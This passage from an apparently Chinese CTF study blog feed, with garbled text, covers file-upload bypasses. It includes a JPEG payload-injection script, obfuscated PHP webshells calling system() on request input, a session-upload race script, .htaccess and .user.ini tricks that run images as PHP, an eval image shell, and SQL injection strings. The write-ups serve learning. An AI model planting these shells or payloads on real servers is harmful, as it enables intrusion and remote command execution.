<span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists(<span class="variable">$filename</span>) || !is_file(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="å…æ€é©¬"><a href="#å…æ€é©¬" class="headerlink" title="å…æ€é©¬"></a>å…æ€é©¬</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;s#y#s#t#e#m&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = explode(<span class="string">&quot;#&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$b</span>[<span class="number">0</span>].<span class="variable">$b</span>[<span class="number">1</span>].<span class="variable">$b</span>[<span class="number">2</span>].<span class="variable">$b</span>[<span class="number">3</span>].<span class="variable">$b</span>[<span class="number">4</span>].<span class="variable">$b</span>[<span class="number">5</span>];</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=substr(<span class="string">&#x27;1s&#x27;</span>,<span class="number">1</span>).<span class="string">&#x27;ystem&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=strrev(<span class="string">&#x27;metsys&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">a=system&amp;b=ls</span><br></pre></td></tr></table></figure><h2 id="sessionç«äº‰ä¸Šä¼ "><a href="#sessionç«äº‰ä¸Šä¼ " class="headerlink" title="sessionç«äº‰ä¸Šä¼ "></a>sessionç«äº‰ä¸Šä¼ </h2><p>å…ˆä¸Šä¼ .user.iniåŒ…å«å¦‚ä¸‹è¯­å¥</p><pre><code>&lt;?=include&quot;/tmp/sess_haorical&quot;?&gt;</code></pre><p>è·‘è„šæœ¬</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">session=requests.session()</span><br><span class="line">sess=<span class="string">&#x27;haorical&#x27;</span></span><br><span class="line">url1=<span class="string">&quot;http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/upload&quot;</span></span><br><span class="line">data1=&#123;</span><br><span class="line"><span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line"><span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;heiheihei&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>():</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = session.post(url1,data=data1,files=file,cookies=cookies)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = session.get(url2)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">       threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="htaccessç»•è¿‡"><a href="#htaccessç»•è¿‡" class="headerlink" title=".htaccessç»•è¿‡"></a>.htaccessç»•è¿‡</h2><p>ä¸Šä¼ .htaccess</p><p>å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .png   //å°†.pngåç¼€çš„æ–‡ä»¶è§£æ æˆphp</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">png</span>&quot;&gt;</span></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line"></span><br><span class="line">php_value auto_prepend_file &quot;shell.png&quot; </span><br><span class="line">#æ•ˆæœå’Œ.user.iniä¸€æ ·ï¼Œç„¶åé€šè¿‡è®¿é—®åŠ è½½phpé¡µé¢å¯ä»¥è§¦å‘.htaccessçš„æŒ‡ä»¤</span><br></pre></td></tr></table></figure><h2 id="appachè§£ææ¼æ´"><a href="#appachè§£ææ¼æ´" class="headerlink" title="appachè§£ææ¼æ´"></a>appachè§£ææ¼æ´</h2><p>apacheé‡åˆ°æ— æ³•è¯†åˆ«è§£æçš„æ–‡ä»¶åç¼€æ—¶ï¼Œä¼šå‘å‰è§£æï¼Œå¦‚xxx.php.123.456,åœ¨mime.typesæ–‡ä»¶ä¸­å¦‚æœä¸å­˜åœ¨.123/.456è¿™ä¸¤ç§åç¼€ï¼Œé‚£ä¹ˆapacheä¼šå°†è¯¥æ–‡ä»¶è§£æä¸ºphpã€‚</p><p>æ¯”å¦‚1.php.jgp</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;åŸºæœ¬æ€è·¯&quot;&gt;&lt;a href=&quot;#åŸºæœ¬æ€è·¯&quot; class=&quot;headerlink&quot; title=&quot;åŸºæœ¬æ€è·¯&quot;&gt;&lt;/a&gt;åŸºæœ¬æ€è·¯&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;ç»•è¿‡å„ç§å‰ç«¯è¿‡æ»¤&lt;/li&gt;
&lt;li&gt;ä¸Šä¼ .user.ini/.htaccess&lt;/li&gt;
&lt;li&gt;ä¸Šä¼ åŒ…å«ä¸€å¥è¯</summary>
      
    
    
    
    <category term="ctfå­¦ä¹ " scheme="http://haorical.xyz/categories/ctf%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
    
    <category term="æ–‡ä»¶ä¸Šä¼ " scheme="http://haorical.xyz/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>20211031</title>
    <link href="http://haorical.xyz/posts/161306f5/"/>
    <id>http://haorical.xyz/posts/161306f5/</id>
    <published>2021-10-30T20:16:02.000Z</published>
    <updated>2021-10-30T20:24:39.546Z</updated>
    
    <content type="html"><![CDATA[<p>å¤±çœ äº†ï¼Œæƒ³äº†æƒ³ä¸çŸ¥é“å¹²ä»€ä¹ˆ</p><p>åˆšå¼€å§‹ç©äº†ä¼šå¤å¢“ä¸½å½±ï¼Œä¸æƒ³ç©äº†</p><p>æƒ³åˆ°å‰æ®µæ—¶é—´æœåŠ¡å™¨å¥½åƒåäº†ï¼Œåˆä¿®äº†ä¿®ï¼Œé‡æ–°åœ¨æœåŠ¡å™¨ä¸ŠæŠŠåšå®¢æ­å¥½äº†</p><p>ç°åœ¨åšå®¢Githubä¸Šå’ŒæœåŠ¡å™¨ä¸Šçš„éƒ½èƒ½ç”¨</p><p>ä¹‹æ‰€ä»¥ä¿ç•™Githubæ˜¯å› ä¸ºè¶³å¤Ÿç¨³å®šï¼Œç”¨çš„æ˜¯ä¸€çº§åŸŸåï¼Œ<a href="https://haorical.xyz/">https://haorical.xyz</a></p><p>æœåŠ¡å™¨ç”¨çš„é˜¿é‡Œäº‘ï¼Œå›½å†…æ¯”è¾ƒå¿«ï¼Œç”¨çš„äºŒçº§åŸŸåï¼Œ<a href="http://blog.haorical.xyz/">http://blog.haorical.xyz</a></p><p>æš‚æ—¶æ²¡éƒ¨ç½²è¯ä¹¦ï¼Œä»¥åå†å¼„å§ï¼Œç°åœ¨ä¸æƒ³å¼„äº†ã€‚</p><p>åˆä¸çŸ¥é“å¹²å•¥äº†ï¼Œè¿‡ä¸¤å¤©ç”Ÿæ—¥ï¼Œä¸€ç‚¹æ„Ÿè§‰éƒ½æ²¡æœ‰ï¼Œæ˜å¤©è¿˜å¾—å¤ä¹ çº¿ä»£è¿˜å¾—æ‰“æ¯”èµ›ã€‚ã€‚ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å¤±çœ äº†ï¼Œæƒ³äº†æƒ³ä¸çŸ¥é“å¹²ä»€ä¹ˆ&lt;/p&gt;
&lt;p&gt;åˆšå¼€å§‹ç©äº†ä¼šå¤å¢“ä¸½å½±ï¼Œä¸æƒ³ç©äº†&lt;/p&gt;
&lt;p&gt;æƒ³åˆ°å‰æ®µæ—¶é—´æœåŠ¡å™¨å¥½åƒåäº†ï¼Œåˆä¿®äº†ä¿®ï¼Œé‡æ–°åœ¨æœåŠ¡å™¨ä¸ŠæŠŠåšå®¢æ­å¥½äº†&lt;/p&gt;
&lt;p&gt;ç°åœ¨åšå®¢Githubä¸Šå’ŒæœåŠ¡å™¨ä¸Šçš„éƒ½èƒ½ç”¨&lt;/p&gt;
&lt;p&gt;ä¹‹æ‰€ä»¥ä¿ç•™Githubæ˜¯å› ä¸ºè¶³å¤Ÿç¨³å®šï¼Œç”¨çš„æ˜¯ä¸€çº§åŸŸ</summary>
      
    
    
    
    <category term="éšç¬”" scheme="http://haorical.xyz/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>20211018</title>
    <link href="http://haorical.xyz/posts/5df9dcd3/"/>
    <id>http://haorical.xyz/posts/5df9dcd3/</id>
    <published>2021-10-18T13:27:21.000Z</published>
    <updated>2021-10-30T20:14:20.104Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;BJDCTF2020-Mark-loves-cat&quot;&gt;&lt;a href=&quot;#BJDCTF2020-Mark-loves-cat&quot; class=&quot;headerlink&quot; title=&quot;[BJDCTF2020]Mark loves cat&quot;&gt;&lt;/a&gt;[BJDCTF202</summary>
      
    
    
    
    <category term="ctfæ¯æ—¥ä¸€é¢˜" scheme="http://haorical.xyz/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    
    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
    
    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>20211017</title>
    <link href="http://haorical.xyz/posts/cd46c142/"/>
    <id>http://haorical.xyz/posts/cd46c142/</id>
    <published>2021-10-17T13:31:05.000Z</published>
    <updated>2021-10-18T13:25:57.370Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>buuè¿™ä¸ªé¢˜åº”è¯¥æ˜¯ç¯å¢ƒæœ‰é—®é¢˜ï¼Œä¸èƒ½å¤ç°wp</p><p>å…ˆä¸Šä¼ user.ini</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_propend_file=<span class="number">1.</span>gif</span><br></pre></td></tr></table></figure><p>ç„¶åä¸Šä¼ å›¾ç‰‡é©¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>è®¿é—®è·¯å¾„ä¸‹çš„index.phpï¼Œè®©å®ƒè‡ªåŠ¨åŠ è½½é©¬</p><p>èšå‰‘æˆ–è€…ç›´æ¥cat flag</p><p>ä¸€ä¼šå„¿åœ¨æœ¬åœ°æµ‹è¯•ä¸€ä¸‹</p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>md5çš„ä¸€äº›åŸºæ“</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;SUCTF-2019-CheckIn&quot;&gt;&lt;a href=&quot;#SUCTF-2019-CheckIn&quot; class=&quot;headerlink&quot; title=&quot;[SUCTF 2019]CheckIn&quot;&gt;&lt;/a&gt;[SUCTF 2019]CheckIn&lt;/h2&gt;&lt;p&gt;buuè¿™</summary>
      
    
    
    
    <category term="ctfæ¯æ—¥ä¸€é¢˜" scheme="http://haorical.xyz/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    
    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
    
    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
    
    <category term="æ–‡ä»¶ä¸Šä¼ " scheme="http://haorical.xyz/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>20211015</title>
    <link href="http://haorical.xyz/posts/2348a06e/"/>
    <id>http://haorical.xyz/posts/2348a06e/</id>
    <published>2021-10-15T15:27:55.403Z</published>
    <updated>2021-10-15T15:32:07.486Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><blockquote><p>æ¨¡æ¿æ³¨å…¥</p></blockquote><p>å…ˆçœ‹æç¤ºï¼Œå‘ç°hintså’Œ/fllllllllllllagï¼Œæ ¹æ®urlçŒœæµ‹æ˜¯ä»»æ„æ–‡ä»¶è¯»å–ï¼Œç ”ç©¶åé¢å‚æ•°ï¼Œçœ‹hintsï¼Œå‘ç°renderï¼Œç ”ç©¶ç ”ç©¶å•¥ç©æ„</p><p>renderæ˜¯ä¸€ä¸ªç±»ä¼¼æ¨¡æ¿çš„ä¸œè¥¿ï¼Œå¯ä»¥ä½¿ç”¨ä¸åŒçš„å‚æ•°æ¥è®¿é—®ç½‘é¡µ</p><p>åœ¨tornadoæ¨¡æ¿ä¸­ï¼Œå­˜åœ¨ä¸€äº›å¯ä»¥è®¿é—®çš„å¿«é€Ÿå¯¹è±¡ï¼Œä¾‹å¦‚ <code>&#123;&#123;handler.settings&#125;&#125;</code></p><p>è¿™ä¸¤ä¸ª<code>&#123;&#123;&#125;&#125;</code>å’Œè¿™ä¸ªå­—å…¸å¯¹è±¡ä¹Ÿè®¸å¤§å®¶å°±çœ‹å‡ºæ¥äº†ï¼Œæ²¡é”™å°±æ˜¯è¿™ä¸ªhandler.settingså¯¹è±¡<br>handler æŒ‡å‘RequestHandler</p><p>è€ŒRequestHandler.settingsåˆæŒ‡å‘self.application.settings</p><p>æ‰€æœ‰handler.settingså°±æŒ‡å‘RequestHandler.application.settings</p><p>å¯ä»¥è·å¾—ä¸€äº›è®¾ç½®</p><p>ç„¶åæˆåŠŸè·å¾—cookie_secretï¼Œmd5è·å¾—hashå€¼å³å¯</p><p>åœ¨msgé¡µé¢å¯ä»¥å®ç°æ¨¡æ¿æ³¨å…¥</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;æŠ¤ç½‘æ¯-2018-easy-tornado&quot;&gt;&lt;a href=&quot;#æŠ¤ç½‘æ¯-2018-easy-tornado&quot; class=&quot;headerlink&quot; title=&quot;[æŠ¤ç½‘æ¯ 2018]easy_tornado&quot;&gt;&lt;/a&gt;[æŠ¤ç½‘æ¯ 2018]easy_tornado</summary>
      
    
    
    
    <category term="ctfæ¯æ—¥ä¸€é¢˜" scheme="http://haorical.xyz/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    
    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
    
    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>å›½åº†èµ›éƒ¨åˆ†èµ›é¢˜å¤ç°</title>
    <link href="http://haorical.xyz/posts/bfdb9200/"/>
    <id>http://haorical.xyz/posts/bfdb9200/</id>
    <published>2021-10-13T11:05:32.000Z</published>
    <updated>2021-10-13T13:59:32.762Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h3><blockquote><p>ç¯å¢ƒæœ‰ç‚¹é—®é¢˜ï¼Œå¤ç°ä¸€åŠå‡ºä¸æ¥äº†</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥åº“å</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(db),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_object_overview#</span><br><span class="line"></span><br><span class="line">æŸ¥è¡¨å</span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="string">&#x27;/**/union/**/select/**/group_concat(table_name),2/**/from/**/sys.schema_table_statistics/**/where/**/table_schema=&#x27;</span>flagisHere<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æ— åˆ—åæ³¨å…¥</span></span><br><span class="line"><span class="string">username=admin&amp;passwd=admin&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span 